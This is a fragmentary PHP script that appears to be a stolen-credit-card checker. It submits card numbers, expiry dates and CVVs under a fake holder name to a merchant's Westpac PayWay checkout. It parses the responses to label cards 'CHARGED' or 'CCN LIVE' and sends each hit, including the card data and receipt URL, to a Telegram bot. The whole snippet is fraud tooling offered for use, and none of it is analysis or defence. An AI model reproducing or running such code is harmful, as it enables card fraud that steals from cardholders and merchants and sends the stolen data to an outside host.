...
$paymentMethods = [
    ...
    'westpac_payway_api' => '/<input[^>]*name="payment_method"[^>]*value="westpac_payway_api"/'
];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'ccholder' => 'Sen Sui',
    'cardtype' => '',
    'westpac_payway_api-card-number' => $cc,
    'westpac_payway_api-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
    'westpac_payway_api-card-cvc' => $cvv,
...
if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED WESTAPI]
    \n[$hostname1]
    \n[$receiptUrl]\n";
    ...
    <span style="color: #d2ff09ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
          ...
          $telegramMessage = "[#CCN]- $lista [CCN LIVE WESTAPI]
    \n[$hostname1]
    \n[$receiptUrl]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);
